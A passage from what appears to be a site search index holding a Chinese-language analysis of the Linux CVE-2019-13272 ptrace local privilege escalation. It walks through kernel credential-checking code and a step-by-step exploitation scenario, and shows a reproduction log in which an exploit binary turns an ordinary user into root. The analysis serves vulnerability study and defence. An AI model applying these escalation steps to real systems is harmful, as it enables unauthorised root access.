shell\n\n\nc.\u590d\u73b0\u6b65\u9aa4\n\n\nroot@ubuntu:/tmp/EXP-CVE-2019-13272# sh make.sh \n$ id\nuid=1001(test) gid=1001(test) groups=1001(test) context=system_u:system_r:kernel_t:s0\n$ /tmp/exp  \nexecuting passwd\nattached to midpid\nroot@ubuntu:/tmp/EXP-CVE-2019-13272# id\nuid=0(root) gid=0(root) groups=0(root),1001(test) context=system_u:system_r:kernel_t:s0\n\n\n\n\nd.\u5229\u7528\u539f\u7406\u7cbe\u51c6\u6982\u62ec\n\n\n\u5229\u7528 pkexec \u7684\u7279\u6027\u548c ptrace \u5728\u5904\u7406 trace_me \u65f6\u4f7f\u7528 cred \u7684\u6f0f\u6d1e\uff0c\u5b9e\u73b0\u4e86 root \u6743\u9650\u7684\u76d7\u7528 \n\n\n5.\u9632\u62a4\u5efa\u8bae\n\n\n\u7ed3\u5408\u6f0f\u6d1e\u539f\u7406\u548c\u5229\u7528\u539f\u7406\uff0c\u4ece\u9632\u62a4\u4ea7\u54c1\u7814\u53d1\u7684\u89d2\u5ea6\uff0c\u63d0\u51fa\uff1a\n\n\na.\u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\nb.\u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\nc.\u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\n6.\u53c2\u8003\n\n\n\n\n broken permission and object lifetime handling for PTRACE_TRACEME",
            "title": "Cve 2019 13272 \u5206\u6790"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#ptrace_traceme-cve-2019-13272",
            "text": "",
            "title": "PTRACE_TRACEME \u672c\u5730\u63d0\u6743\u6f0f\u6d1e(CVE-2019-13272)\u89e3\u6790"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#0",
            "text": "chengjia4574@gmail.com from iceswordlab",
            "title": "0.\u4f5c\u8005"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#1",
            "text": "",
            "title": "1.\u80cc\u666f\u4ecb\u7ecd"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#a",
            "text": "linux kernel ptrace \u5b50\u6a21\u5757",
            "title": "a.\u4ec0\u4e48\u8f6f\u4ef6\u7684\u6f0f\u6d1e"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#b",
            "text": "ptrace  \u662f\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u65b9\u6cd5\u6765\u8ba9\u8fdb\u7a0b (tracer) \u53ef\u4ee5\u89c2\u5bdf\u548c\u63a7\u5236\u5176\u5b83\u8fdb\u7a0b (tracee) \u7684\u6267\u884c\uff0c\u68c0\u67e5\u548c\u6539\u53d8\u5176\u6838\u5fc3\u6620\u50cf\u4ee5\u53ca\u5bc4\u5b58\u5668, \u4e3b\u8981\u7528\u6765\u5b9e\u73b0\u65ad\u70b9\u8c03\u8bd5\u548c\u7cfb\u7edf\u8c03\u7528\u8ddf\u8e2a",
            "title": "b.\u8fd9\u4e2a\u8f6f\u4ef6\u7684\u7b80\u4ecb"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#c",
            "text": "\u6743\u9650\u63d0\u5347",
            "title": "c.\u6f0f\u6d1e\u80fd\u9020\u6210\u4ec0\u4e48\u5371\u5bb3"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#d",
            "text": "setuid executable    euid  exec    setuid \u4f4d    TOCTOU    pkexec    polkit",
            "title": "d.\u5176\u4ed6\u5bf9\u4e86\u89e3\u6f0f\u6d1e\u6709\u5229\u7684\u80cc\u666f\u77e5\u8bc6"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#2",
            "text": "",
            "title": "2.\u6f0f\u6d1e\u5206\u6790"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#a_1",
            "text": "ptrace \u8c03\u7528\u8fc7\u7a0b\u4e2d\u5185\u6838\u5173\u4e8e\u6743\u9650 cred \u7684\u4f7f\u7528\u6709\u903b\u8f91\u9519\u8bef  \u672c\u8d28\u4e0a\u8fd9\u4e2a\u6f0f\u6d1e\u6709\u70b9\u50cf  TOCTOU  \u7c7b\u6f0f\u6d1e, ptracer_cred \u7684\u83b7\u53d6\u662f\u5728 traceme \u9636\u6bb5,  \u800c ptracer_cred \u7684\u5e94\u7528\u662f\u5728\u968f\u540e\u7684\u5404\u79cd request \u9636\u6bb5\uff0c \u800c\u5728\u968f\u540e\u7684 ptrace request \u7684\u65f6\u5019\uff0c tracer \u7684 cred \u53ef\u80fd\u5df2\u7ecf\u4e0d\u662f\u4e00\u5f00\u59cb\u5efa\u7acb trace link \u65f6\u7684\u90a3\u4e2a cred \u4e86",
            "title": "a.\u6f0f\u6d1e\u539f\u7406\u7cbe\u51c6\u6982\u62ec"
        },
        {
            "location": "/kernel/cve-2019-13272-\u5206\u6790/#b_1",
            "text": "1    396  kernel/ptrace.c <<ptrace_attach>>\n             ptrace_link(task, current);  // link \u7684\u53cc\u65b9\u5206\u522b\u662f\u8981 trace \u7684\u76ee\u6807\u8fdb\u7a0b 'task' \n                      //  \u548c\u53d1\u52a8 trace \u7684\u5f53\u524d\u8fdb\u7a0b 'current'\n   2    469  kernel/ptrace.c <<ptrace_traceme>>\n             ptrace_link(current, current->real_parent);  // link \u7684\u53cc\u65b9\u5206\u522b\u662f\u53d1\u52a8 trace \u7684\n                              // \u5f53\u524d\u8fdb\u7a0b \u2018current\u2019 \u548c\u5f53\u524d\u8fdb\u7a0b\u7684\n                              // \u7236\u8fdb\u7a0b ' current->real_parent'  trace \u5173\u7cfb\u7684\u5efa\u7acb\u6709 2 \u79cd\u65b9\u5f0f   1 \u662f\u8fdb\u7a0b\u8c03\u7528 fork \u51fd\u6570\u7136\u540e\u5b50\u8fdb\u7a0b\u4e3b\u52a8\u8c03\u7528 PTRACE_TRACEME, \u8fd9\u662f\u7531 tracee \u53d1\u8d77\u7684, \u5bf9\u5e94\u5185\u6838\u51fd\u6570 ptrace_traceme  2 \u662f\u8fdb\u7a0b\u8c03\u7528 PTRACE_ATTACH \u6216\u8005 PTRACE_SEIZE \u53bb\u4e3b\u52a8 trace \u5176\u4ed6\u8fdb\u7a0b, \u8fd9\u662f\u7531 tracer \u53d1\u8d77\u7684, \u5bf9\u5e94\u5185\u6838\u51fd\u6570 ptrace_attach   \u4e0d\u7ba1\u662f\u54ea\u79cd\u65b9\u5f0f\uff0c\u6700\u540e\u90fd\u4f1a\u8c03\u7528 ptrace_link \u51fd\u6570\u53bb\u5efa\u7acb tracer \u548c tracee \u4e4b\u95f4\u7684 trace \u5173\u7cfb   ptrace_attach \u5173\u8054\u7684\u53cc\u65b9\u662f 'task' (tracee) \u548c 'current' (tracer)   ptrace_traceme \u5173\u8054\u7684\u53cc\u65b9\u662f 'current' (tracee) \u548c 'current->real_parent' (tracer)   \u8fd9\u91cc\u6211\u4eec\u8981\u4ed4\u7ec6\u8bb0\u4f4f\u4e0a\u9762 2 \u79cd\u6a21\u5f0f\u4e0b tracer \u548c tracee \u5206\u522b\u662f\u4ec0\u4e48\uff0c\u56e0\u4e3a\u8fd9\u5c31\u662f\u6f0f\u6d1e\u7684\u5173\u952e  static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)\n{\n        rcu_read_lock();\n        __ptrace_link(child, new_parent, __task_cred(new_parent));\n        rcu_read_unlock();\n}\n\nvoid __ptrace_link(struct task_struct *child, struct task_struct *new_parent,\n                   const struct cred *ptracer_cred)\n{\n        BUG_ON(!list_empty(&child->ptrace_entry));\n        list_add(&child->ptrace_entry, &new_parent->ptraced); // 1. \u5c06\u81ea\u5df1\u52a0\u5165\u7236\u8fdb\u7a0b\u7684 ptraced \u961f\u5217\n        child->parent = new_parent; // 2. \u5c06\u7236\u8fdb\u7a0b\u5730\u5740\u4fdd\u5b58\u5728 parent \u6307\u9488\n        child->ptracer_cred = get_cred(ptracer_cred); // 3. \u4fdd\u5b58 ptracer_cred, \u6211\u4eec\u53ea\u5173\u6ce8\u8fd9\u4e2a\u53d8\u91cf\n}  \u5efa\u7acb trace \u5173\u7cfb\u7684\u5173\u952e\u662f\u7531 tracee \u8bb0\u5f55 tracer \u7684 cred, \u4fdd\u5b58\u5728 tracee \u7684 'ptracer_cred' \u53d8\u91cf\uff0c\u8fd9\u4e2a\u53d8\u91cf\u540d\u5f88\u987e\u540d\u601d\u4e49  ptracer_cred \u8fd9\u4e2a\u6982\u5ff5\u662f\u7531 2016 \u5e74\u7684\u4e00\u4e2a\u8865\u4e01  ptrace: Capture the ptracer's creds not PT_PTRACE_CAP  \u5f15\u5165\u7684, \u5f15\u5165 ptracer_cred \u7684\u76ee\u7684\u662f\u7528\u4e8e\u5f53 tracee \u6267\u884c exec \u53bb\u52a0\u8f7d  setuid executable  \u65f6\u505a\u5b89\u5168\u68c0\u6d4b  \u4e3a\u4ec0\u4e48\u9700\u8981\u8fd9\u4e2a\u5b89\u5168\u68c0\u6d4b\u5462?  exec  \u51fd\u6570\u65cf\u53ef\u4ee5\u66f4\u65b0\u8fdb\u7a0b\u7684\u955c\u50cf, \u5982\u679c\u88ab\u6267\u884c\u6587\u4ef6\u7684  setuid \u4f4d  \u7f6e\u4f4d\uff0c\u5219\u8fd0\u884c\u8fd9\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u65f6\uff0c\u8fdb\u7a0b\u7684  euid  \u4f1a\u88ab\u4fee\u6539\u6210\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6240\u6709\u8005\u7684 uid, \u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6240\u6709\u8005\u6743\u9650\u6bd4\u8c03\u7528 exec \u7684\u8fdb\u7a0b\u9ad8, \u8fd0\u884c\u8fd9\u7c7b  setuid executable  \u4f1a\u6709\u63d0\u6743\u7684\u6548\u679c  \u5047\u5982\u6267\u884c exec \u7684\u8fdb\u7a0b\u672c\u8eab\u662f\u4e00\u4e2a tracee, \u5f53\u5b83\u6267\u884c\u4e86  setuid executable  \u63d0\u6743\u4e4b\u540e\uff0c\u7531\u4e8e tracer \u53ef\u4ee5\u968f\u65f6\u4fee\u6539 tracee \u7684\u5bc4\u5b58\u5668\u548c\u5185\u5b58\uff0c\u8fd9\u65f6\u5019\u4f4e\u6743\u9650\u7684 tracer \u5c31\u53ef\u4ee5\u63a7\u5236 tracee \u53bb\u6267\u884c\u8d8a\u6743\u64cd\u4f5c  \u4f5c\u4e3a\u5185\u6838\uff0c\u663e\u7136\u662f\u4e0d\u5141\u8bb8\u8fd9\u6837\u7684\u8d8a\u6743\u884c\u4e3a\u5b58\u5728\u7684\uff0c\u6240\u4ee5\u5f53 trace \u5173\u7cfb\u5efa\u7acb\u65f6, tracee \u9700\u8981\u4fdd\u5b58 tracer \u7684 cred (\u5373 ptracer_cred), \u7136\u540e\u5728\u6267\u884c exec \u8fc7\u7a0b\u4e2d, \u5982\u679c\u53d1\u73b0\u6267\u884c\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u662f  setuid \u4f4d  \u7f6e\u4f4d\u7684\uff0c \u5219\u4f1a\u5224\u65ad 'ptracer_cred' \u7684\u6743\u9650\uff0c \u5982\u679c\u6743\u9650\u4e0d\u6ee1\u8db3\uff0c\u5c06\u4e0d\u4f1a\u6267\u884c   setuid \u4f4d  \u7684\u63d0\u6743\uff0c \u800c\u662f\u4ee5\u539f\u6709\u7684\u8fdb\u7a0b\u6743\u9650\u6267\u884c\u8fd9\u4e2a   setuid executable    \u8fd9\u4e2a\u8fc7\u7a0b\u7684\u4ee3\u7801\u5206\u6790\u5982\u4e0b(\u672c\u6587\u7684\u4ee3\u7801\u5206\u6790\u57fa\u4e8e v4.19-rc8)  do_execve\n  -> __do_execve_file\n  -> prepare_binprm \n      -> bprm_fill_uid\n      -> security_bprm_set_creds\n          ->cap_bprm_set_creds\n        -> ptracer_capable\n          ->selinux_bprm_set_creds\n          ->(apparmor_bprm_set_creds)\n          ->(smack_bprm_set_creds)\n          ->(tomoyo_bprm_set_creds)  \u5982\u4e0a\uff0cexecve \u6743\u9650\u76f8\u5173\u7684\u64cd\u4f5c\u4e3b\u8981\u5728\u51fd\u6570 \u2018prepare_binprm\u2019 \u91cc      1567 int prepare_binprm(struct linux_binprm *bprm)\n    1568 {\n    1569         int retval;\n    1570         loff_t pos = 0;\n    1571 \n    1572         bprm_fill_uid(bprm); // <-- \u521d\u6b65\u586b\u5145\u65b0\u8fdb\u7a0b\u7684 cred\n    1573 \n    1574         /* fill in binprm security blob */\n    1575         retval = security_bprm_set_creds(bprm); // <-- \u5b89\u5168\u68c0\u6d4b\uff0c   \n                             // \u53ef\u80fd\u4f1a\u4fee\u6539\u65b0\u8fdb\u7a0b\u7684 cred\n    1576         if (retval)\n    1577                 return retval;\n    1578         bprm->called_set_creds = 1;\n    1579 \n    1580         memset(bprm->buf, 0, BINPRM_BUF_SIZE);\n    1581         return kernel_read(bprm->file, bprm->buf, BINPRM_BUF_SIZE, &pos);\n    1582 }  \u5982\u4e0a\uff0c\u5148\u8c03\u7528 'bprm_fill_uid' \u521d\u6b65\u586b\u5145\u65b0\u8fdb\u7a0b\u7684 cred, \u518d\u8c03\u7528 'security_bprm_set_creds' \u505a\u5b89\u5168\u68c0\u6d4b\u5e76\u4fee\u6539\u65b0\u7684 cred      1509 static void bprm_fill_uid(struct linux_binprm *bprm)\n    1510 {\n    1511         struct inode *inode;\n    1512         unsigned int mode;\n    1513         kuid_t uid;\n    1514         kgid_t gid;\n    1515 \n    1516         /*\n    1517          * Since this can be called multiple times (via prepare_binprm),\n    1518          * we must clear any previous work done when setting set[ug]id\n    1519          * bits from any earlier bprm->file uses (for example when run\n    1520          * first for a setuid script then again for its interpreter).\n    1521          */\n    1522         bprm->cred->euid = current_euid(); // <--- \u5148\u4f7f\u7528\u672c\u8fdb\u7a0b\u7684euid\n    1523         bprm->cred->egid = current_egid();\n    1524 \n    1525         if (!mnt_may_suid(bprm->file->f_path.mnt))\n    1526                 return;\n    1527 \n    1528         if (task_no_new_privs(current))\n    1529                 return;\n    1530 \n    1531         inode = bprm->file->f_path.dentry->d_inode;\n    1532         mode = READ_ONCE(inode->i_mode);\n    1533         if (!(mode & (S_ISUID|S_ISGID))) // <---------- \u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6\u6ca1\u6709 setuid/setgid \u4f4d\uff0c\u8fd9\u91cc\u5c31\u53ef\u4ee5\u8fd4\u56de\u4e86\n    1534                 return;\n    1535 \n    1536         /* Be careful if suid/sgid is set */\n    1537         inode_lock(inode);\n    1538 \n    1539         /* reload atomically mode/uid/gid now that lock held */\n    1540         mode = inode->i_mode;\n    1541         uid = inode->i_uid; // <---- \u5982\u679c\u6587\u4ef6 S_ISUID \u7f6e\u4f4d\uff0c\u4f7f\u7528\u6587\u4ef6\u7684 i_uid\n    1542         gid = inode->i_gid;\n    1543         inode_unlock(inode);\n    1544 \n    1545         /* We ignore suid/sgid if there are no mappings for them in the ns */\n    1546         if (!kuid_has_mapping(bprm->cred->user_ns, uid) ||\n    1547                  !kgid_has_mapping(bprm->cred->user_ns, gid))\n    1548                 return;\n    1549 \n    1550         if (mode & S_ISUID) {\n    1551                 bprm->per_clear |= PER_CLEAR_ON_SETID;\n    1552                 bprm->cred->euid = uid; // <------ \u4f7f\u7528\u6587\u4ef6\u7684 i_uid \u4f5c\u4e3a\u65b0\u8fdb\u7a0b\u7684 euid\n    1553         }\n    1554 \n    1555         if ((mode & (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) {\n    1556                 bprm->per_clear |= PER_CLEAR_ON_SETID;\n    1557                 bprm->cred->egid = gid;\n    1558         }\n    1559 }  \u5982\u4e0a\uff0c \u4e3b\u8981\u770b\u4e24\u884c   1522 \u884c, \u5c06\u5f53\u524d\u7684 euid \u8d4b\u503c\u65b0\u7684 euid, \u6240\u4ee5\u5927\u90e8\u5206\u6267\u884c\u4e86 execve \u7684\u8fdb\u7a0b\u7684\u6743\u9650\u8ddf\u539f\u6765\u7684\u4e00\u6837  1552 \u884c\uff0c\u5982\u679c\u5e26\u6709 suid bit, \u5219\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6240\u6709\u8005\u7684 uid \u8d4b\u503c\u65b0\u7684 euid, \u8fd9\u5c31\u662f\u6240\u8c13 setuid \u7684\u5b9e\u73b0\uff0c \u65b0\u7684 euid \u53d8\u6210\u4e86\u5b83\u6267\u884c\u7684\u53ef\u6267\u884c\u6587\u4ef6\u6240\u6709\u8005\u7684 uid\uff0c \u5982\u679c\u6240\u6709\u8005\u662f\u7279\u6743\u7528\u6237\uff0c \u8fd9\u91cc\u5c31\u5b9e\u73b0\u4e86\u63d0\u6743   \u4f46\u662f\uff0c\u8fd9\u91cc\u7684 euid \u4f9d\u7136\u4e0d\u662f\u6700\u7ec8\u7684\u7ed3\u679c\uff0c \u8fd8\u9700\u8981\u8fdb\u5165\u51fd\u6570 security_bprm_set_creds \u505a\u8fdb\u4e00\u6b65\u7684\u5b89\u5168\u68c0\u6d4b  security_bprm_set_creds \u51fd\u6570\u8c03\u7528\u7684\u662f  LSM  \u6846\u67b6  \u5728\u6211\u5206\u6790\u7684\u5185\u6838\u7248\u672c\u4e0a, \u5b9e\u73b0 'bprm_set_creds' \u8fd9\u4e2a hook \u70b9\u5b89\u5168\u68c0\u6d4b\u7684 lsm \u6846\u67b6\u6709 5 \u79cd, \u68c0\u6d4b\u51fd\u6570\u5982\u4e0b,    cap_bprm_set_creds  selinux_bprm_set_creds  apparmor_bprm_set_creds  smack_bprm_set_creds  tomoyo_bprm_set_creds   \u8fd9\u91cc\u54ea\u4e9b hook \u68c0\u6d4b\u51fd\u6570\u4f1a\u88ab\u6267\u884c\uff0c\u5176\u5b9e\u662f\u8ddf\u5177\u4f53\u7684\u5185\u6838\u914d\u7f6e\u6709\u5173\u7684, \u7406\u8bba\u4e0a\u628a\u6240\u6709 lsm \u6846\u67b6\u90fd\u542f\u7528\u7684\u8bdd\uff0c\u4e0a\u8ff0\u6240\u6709\u8fd9\u4e9b\u5b9e\u73b0\u4e86 'bprm_set_creds' hook \u68c0\u6d4b\u7684\u51fd\u6570\u90fd\u4f1a\u88ab\u6267\u884c   \u5728\u6211\u7684\u5206\u6790\u73af\u5883\u91cc\u5b9e\u9645\u8fd0\u884c\u7684\u68c0\u6d4b\u51fd\u6570\u53ea\u6709 cap_bprm_set_creds \u548c selinux_bprm_set_creds \u8fd9\u4fe9  \u5176\u4e2d\uff0c \u5bf9 euid \u6709\u5f71\u54cd\u7684\u662f 'cap_bprm_set_creds' \u8fd9\u4e2a\u51fd\u6570      815 int cap_bprm_set_creds(struct linux_binprm *bprm)\n    816 {\n    817         const struct cred *old = current_cred();\n    818         struct cred *new = bprm->cred;\n    819         bool effective = false, has_fcap = false, is_setid;\n    820         int ret;\n    821         kuid_t root_uid;\n    ===================== skip ======================\n    838         /* Don't let someone trace a set[ug]id/setpcap binary with the revised\n    839          * credentials unless they have the appropriate permit.\n    840          *\n    841          * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.\n    842          */\n    843         is_setid = __is_setuid(new, old) || __is_setgid(new, old);  \n    844 \n    845         if ((is_setid || __cap_gained(permitted, new, old)) && // <---- \u68c0\u6d4b\u662f\u5426\u6267\u884c\u7684\u662f setid \u7a0b\u5e8f\n    846             ((bprm->unsafe & ~LSM_UNSAFE_PTRACE) || \n    847              !ptracer_capable(current, new->user_ns))) { // <----- \u5982\u679c\u6267\u884cexecve\u7684\u8fdb\u7a0b\u88abtrace\u4e86\uff0c\u4e14\u6267\u884c\u7684\u7a0b\u5e8f\u662f setuid \u7684\uff0c\u9700\u8981\u589e\u52a0\u6743\u9650\u68c0\u6d4b\n    848                 /* downgrade; they get no more than they had, and maybe less */\n    849                 if (!ns_capable(new->user_ns, CAP_SETUID) ||\n    850                     (bprm->unsafe & LSM_UNSAFE_NO_NEW_PRIVS)) {\n    851                         new->euid = new->uid; // <----- \u5982\u679c\u68c0\u6d4b\u4e0d\u901a\u8fc7\uff0c\u4f1a\u5c06\u65b0\u8fdb\u7a0b\u7684 euid \u91cd\u65b0\u8bbe\u7f6e\u4e3a\u539f\u8fdb\u7a0b\u7684 uid\n    852                         new->egid = new->gid;\n    853                 }\n    854                 new->cap_permitted = cap_intersect(new->cap_permitted,\n    855                                                    old->cap_permitted);\n    856         }\n    857 \n    858         new->suid = new->fsuid = new->euid;\n    859         new->sgid = new->fsgid = new->egid;\n    ===================== skip ======================\n}  \u5982\u4e0a   \u884c 845, \u68c0\u6d4b euid \u662f\u5426\u8ddf\u539f\u6709\u7684 uid \u4e0d\u4e00\u81f4 (\u5728\u51fd\u6570 bprm_fill_uid \u5206\u6790\u91cc\u6211\u4eec\u77e5\u9053\uff0c\u5982\u679c\u6267\u884c\u7684\u6587\u4ef6\u662f setuid bit \u7684\uff0c euid \u5c31\u4f1a\u4e0d\u4e00\u81f4)\n      \u6240\u4ee5\u8fd9\u91cc\u7b49\u540c\u4e8e\u68c0\u6d4b\u6267\u884c\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u662f\u4e0d\u662f setid \u7a0b\u5e8f  \u884c 847, \u68c0\u6d4b\u672c\u8fdb\u7a0b\u662f\u5426\u662f tracee    \u5982\u679c\u4e24\u4e2a\u6761\u4ef6\u540c\u65f6\u6ee1\u8db3\uff0c\u9700\u8981\u6267\u884c ptracer_capable \u51fd\u6570\u8fdb\u884c\u6743\u9650\u68c0\u6d4b\uff0c\u5047\u8bbe\u68c0\u6d4b\u4e0d\u901a\u8fc7\uff0c \u4f1a\u6267\u884c downgrade \u964d\u6743   \u884c 851, \u5c06 new->euid \u7684\u503c\u91cd\u65b0\u53d8\u6210 new->uid\uff0c \u5c31\u662f\u8bf4\u5728\u51fd\u6570 bprm_fill_uid \u91cc\u63d0\u7684\u6743\u5728\u8fd9\u91cc\u53ef\u80fd\u53c8\u88ab\u964d\u56de\u53bb       499 bool ptracer_capable(struct task_struct *tsk, struct user_namespace *ns)\n    500 {\n    501         int ret = 0;  /* An absent tracer adds no restrictions */\n    502         const struct cred *cred;\n    503         rcu_read_lock();\n    504         cred = rcu_dereference(tsk->ptracer_cred); // <----- \u53d6\u51fa ptrace_link \u65f6\u4fdd\u5b58\u7684 ptracer_cred \n    505         if (cred)\n    506                 ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE); // <-------- \u8fdb\u5165 lsm \u6846\u67b6\u8fdb\u884c\u5b89\u5168\u68c0\u6d4b\n    507         rcu_read_unlock();\n    508         return (ret == 0);\n    509 }  \u5982\u4e0a\uff0c    \u884c 504, \u53d6\u51fa 'tsk->ptracer_cred'   \u884c 506, \u8fdb\u5165 lsm \u6846\u67b6\u5bf9 \u2018tsk->ptracer_cred\u2019 \u8fdb\u884c\u68c0\u6d4b   \u5230\u4e86\u8fd9\u91cc\uff0c \u8fd9\u4e2a\u6f0f\u6d1e\u6d89\u53ca\u5230\u7684\u53d8\u91cf \u2018tsk->ptracer_cred\u2019 \u7ec8\u4e8e\u51fa\u73b0\u4e86\uff0c \u5982\u524d\u6240\u8ff0\uff0c\u8fd9\u4e2a\u53d8\u91cf\u662f\u5efa\u7acb trace \u5173\u7cfb\u65f6\uff0c tracee \u4fdd\u5b58\u7684 tracer \u7684 cred  \u5f53 tracee \u968f\u540e\u6267\u884c execve \u53bb\u6267\u884c suid \u53ef\u6267\u884c\u7a0b\u5e8f\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528 ptracer_capable \u8fd9\u4e2a\u51fd\u6570\uff0c \u901a\u8fc7 lsm \u91cc\u7684\u5b89\u5168\u6846\u67b6\u53bb\u5224\u65ad \u2018ptracer_cred\u2019 \u7684\u6743\u9650  lsm \u6846\u67b6\u91cc\u7684 capable hook \u68c0\u6d4b\u6211\u4eec\u8fd9\u91cc\u4e0d\u5206\u6790\u4e86\uff0c \u7b80\u5355\u6765\u8bf4\uff0c \u5982\u679c tracer \u672c\u8eab\u662f root \u6743\u9650\uff0c \u5219\u8fd9\u91cc\u7684\u68c0\u6d4b\u4f1a\u901a\u8fc7\uff0c \u5982\u679c\u4e0d\u662f\uff0c \u5c31\u4f1a\u8fd4\u56de\u5931\u8d25  \u6839\u636e\u524d\u9762\u7684\u5206\u6790\uff0c\u5982\u679c  ptracer_capable \u68c0\u6d4b\u5931\u8d25\uff0c new->euid \u7684\u6743\u9650\u4f1a\u88ab\u964d\u56de\u53bb  \u4e3e\u4e2a\u4f8b\u5b50\uff0c A ptrace B , B execve \u6267\u884c '/usr/bin/passwd', \u6839\u636e\u4e0a\u9762\u4ee3\u7801\u7684\u5206\u6790\uff0c \u5982\u679c A \u662f root \u6743\u9650\uff0c \u5219 B \u6267\u884c passwd \u65f6\u7684 euid \u662f root, \u5426\u5219\u5c31\u8fd8\u662f\u539f\u6709\u7684\u6743\u9650  kernel/ptrace.c <<ptrace_traceme>>\n             ptrace_link(current, current->real_parent);  \n\nstatic void ptrace_link(struct task_struct *child, struct task_struct *new_parent)\n{\n        rcu_read_lock();\n        __ptrace_link(child, new_parent, __task_cred(new_parent));\n        rcu_read_unlock();\n}  \u56de\u5230\u6f0f\u6d1e\u4ee3\u7801, \u4e3a\u4ec0\u4e48 traceme \u5728\u5efa\u7acb trace link \u65f6\u8bb0\u5f55 parent \u7684 cred \u662f\u4e0d\u5bf9\u7684\u5462?  \u660e\u660e\u8fd9\u65f6\u5019 parent \u5c31\u662f tracer \u554a?  \u6211\u4eec\u7528 Jann Horn \u4e3e\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u4e3a\u4ec0\u4e48 traceme \u8fd9\u79cd\u65b9\u5f0f\u5efa\u7acb trace link \u65f6\u4e0d\u80fd\u4f7f\u7528 tracer \u7684 cred   - 1, task A: fork()s a child, task B\n - 2, task B: fork()s a child, task C\n - 3, task B: execve(/some/special/suid/binary)\n - 4, task C: PTRACE_TRACEME (creates privileged ptrace relationship)\n - 5, task C: execve(/usr/bin/passwd)\n - 6, task B: drop privileges (setresuid(getuid(), getuid(), getuid()))\n - 7, task B: become dumpable again (e.g. execve(/some/other/binary))\n - 8, task A: PTRACE_ATTACH to task B\n - 9, task A: use ptrace to take control of task B\n - 10, task B: use ptrace to take control of task C  \u5982\u4e0a\u573a\u666f\u6709 3 \u4e2a\u8fdb\u7a0b A, B, C   \u7b2c 4 \u6b65\uff0c task C \u4f7f\u7528 PTRACE_TRACE \u5efa\u7acb\u8ddf B \u7684 trace link \u65f6\uff0c \u7531\u4e8e B \u6b64\u65f6\u662f euid = 0 (\u56e0\u4e3a\u5b83\u521a\u521a\u6267\u884c\u4e86 suid binary), \u6240\u4ee5 C \u8bb0\u5f55\u7684 ptracer_cred \u7684 euid \u4e5f\u662f 0   \u7b2c 5 \u6b65\uff0c task C \u968f\u540e\u6267\u884c execve(suid binary), \u6839\u636e\u6211\u4eec\u4e0a\u9762\u7684\u5206\u6790\uff0c\u7531\u4e8e C \u7684 ptracer_cred \u662f\u7279\u6743\u7684\uff0c \u6240\u4ee5 ptracer_capable \u51fd\u6570\u68c0\u6d4b\u901a\u8fc7\uff0c\u6240\u4ee5\u6267\u884c\u5b8c execve \u540e\uff0c task C \u7684 euid \u4e5f\u63d0\u6743\u6210 0 , \u6ce8\u610f\u6b64\u65f6 B \u548c C \u7684 trace link \u8fd8\u662f\u6709\u6548\u7684  \u7b2c 6 \u6b65\uff0c task B \u6267\u884c setresuid \u5c06\u81ea\u5df1\u964d\u6743\uff0c \u8fd9\u4e2a\u964d\u6743\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u80fd\u8ba9 task A attach  \u7b2c 8 \u6b65\uff0c task A \u4f7f\u7528 PTRACE_ATTACH \u5efa\u7acb\u8ddf B \u7684 trace link, A \u548c B \u90fd\u662f\u666e\u901a\u6743\u9650, \u4e4b\u540e A \u53ef\u4ee5\u63a7\u5236 B \u6267\u884c\u4efb\u4f55\u64cd\u4f5c  \u7b2c 9 \u6b65\uff0c task B \u63a7\u5236 task C \u6267\u884c\u63d0\u6743\u64cd\u4f5c   \u524d\u9762 8 \u6b65\uff0c\u4f9d\u636e\u4e4b\u524d\u7684\u4ee3\u7801\u5206\u6790\u90fd\u662f\u6210\u7acb\u7684\uff0c\u90a3\u4e48\u7b2c 9 \u6b65\u80fd\u4e0d\u80fd\u6210\u7acb\u5462?  \u6267\u884c\u7b2c 9 \u6b65\u65f6\uff0c task B \u672c\u8eab\u662f\u666e\u901a\u6743\u9650\uff0c task C \u7684 euid \u662f root \u6743\u9650\uff0c B \u548c C \u7684 trace link \u6709\u6548, \u8fd9\u79cd\u6761\u4ef6\u4e0b B \u80fd\u4e0d\u80fd\u53d1\u9001 ptrace request \u8ba9 C \u6267\u884c\u5404\u79cd\u64cd\u4f5c\uff0c\u5305\u62ec\u63d0\u6743\u64cd\u4f5c?   \u4e0b\u9762\u6211\u4eec\u7ed3\u5408\u4ee3\u7801\u5206\u6790\u8fd9\u4e2a\u95ee\u9898  \n    1111 SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,\n    1112                 unsigned long, data)\n    1113 {\n    1114         struct task_struct *child;\n    1115         long ret;\n    1116 \n    1117         if (request == PTRACE_TRACEME) {\n    1118                 ret = ptrace_traceme(); // <----- \u8fdb\u5165 traceme \u5206\u652f\n    1119                 if (!ret)\n    1120                         